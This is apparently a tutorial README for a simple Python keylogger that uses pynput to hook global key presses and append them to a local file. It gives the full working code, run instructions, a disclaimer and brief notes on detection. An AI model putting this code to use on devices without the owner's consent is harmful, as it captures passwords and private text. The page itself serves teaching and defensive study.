# Keystroke Event Listener & Input Logger (Python)

A Python demonstration script using the `pynput` library to capture keyboard input events from the operating system and append them sequentially to a local text file (`KeyLogging.txt`). 

> **Educational & Security Disclaimer**: This code is intended strictly for educational study, internal software testing, and understanding OS event-hook mechanisms. Unconsented monitoring or keystroke logging on devices without explicit user authorization is illegal and violates software security policies.

---

## Technical Overview

The script demonstrates event-driven input handling in Python:

- **OS Input Hooking**: Utilizes `pynput.keyboard.Listener` to create a global keyboard hook that monitors key-press events across the operating system.
- **Key Object Parsing**:
  - **Standard Characters**: Normal alphanumeric keys contain a `.char` attribute written directly to the file.
  - **Special / Control Keys**: Non-alphanumeric keys (such as `Key.space`, `Key.enter`, or `Key.shift`) lack a `.char` attribute, triggering an `AttributeError`. The script catches this exception and formats the key object string enclosed in brackets (e.g., `[Key.space]`).
- **File I/O Stream**: Appends formatted strings (`"a"` mode) to `KeyLogging.txt` synchronously upon each key event.

---

## Prerequisites

- **Python Version**: Python 3.6 or higher.
- **Dependencies**: The `pynput` library must be installed.
  ```bash
  pip install pynput
  ```
- **OS Permissions**: Modern operating systems require explicit privacy or accessibility permissions for scripts to listen to global input events (e.g., Accessibility access under macOS System Settings or elevated privileges under Linux X11/Wayland).

---

## Usage Instructions

1. **Save the Script**: Save the code as `key_listener.py`.
2. **Execute the Script**: Run the script from your terminal:
   ```bash
   python key_listener.py
   ```
3. **Execution Loop**: The `listener.join()` call keeps the listener thread active, capturing inputs until the process is explicitly stopped (e.g., via `Ctrl+C` in the terminal).
4. **Log Output**: Recorded key events will accumulate in `KeyLogging.txt` within the execution directory.

---

## Code Breakdown

```python
# THIS IS ONLY MADE FOR EDUCATIONAL PURPOSES ONLY!!!!!
# This is my python keylogger 

# Importing the proper library in order to make the program run
from pynput.keyboard import Key, Listener

def logging(key):
    try: # This will log your normal alphanumeric keys
        with open("KeyLogging.txt", "a") as file:
            file.write(f"{key.char}")

    except AttributeError: # This logs special characters separately
        with open("KeyLogging.txt", "a") as file:
            file.write(f" [{key}] ")

# Instantiate and start the keyboard listener
with Listener(on_press=logging) as listener:
    listener.join() # This keeps the program running and captures keystrokes continuously
```

---

## Defensive & Security Analysis

- **Detection Mechanics**: Security solutions (Antivirus, EDR, Endpoint Protection) monitor API hooks and process behavior. Unhandled global input listeners are routinely flagged by behavioral analysis tools.
- **OS Protection Controls**: Modern operating systems isolate application input contexts to prevent untrusted background applications from intercepting system-wide inputs.
- **Optimization Considerations**: Opening and closing file handles on every individual keystroke creates unnecessary I/O overhead. In standard software development, input buffers or logging framework handlers are preferred for performance and efficiency.

---

## License

Educational Use Only.
